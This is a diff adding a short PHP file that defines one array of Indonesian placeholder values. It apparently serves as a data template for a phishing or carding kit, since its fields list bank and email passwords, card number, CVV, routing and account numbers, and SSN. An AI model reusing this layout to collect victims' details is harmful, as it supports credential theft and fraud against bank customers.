@@ -1,0 +1,21 @@
+<?php
+$data = array(
+    'username' => 'ini user bank',
+    'pw1' => 'ini pw bank',
+    'usremail' => 'ini email',
+    'pw2' => 'ini pw email',
+    'name' => 'ini nama panjang',
+    'dob' => 'ini tanggal lahir',
+    'addr' => 'ini alamat',
+    'city' => 'ini kota',
+    'state' => 'ini state',
+    'zip' => 'ini zip',
+    'phone' => 'ini phone',
+    'cc' => 'ini cardno',
+    'mm' => 'ini bulannya',
+    'yy' => 'ini tahunnya',
+    'cvv' => 'ini cvc',
+    'routing' => 'ini no routing',
+    'account' => 'ini no acc',
+    'ssn' => 'ini no ssn'
+);
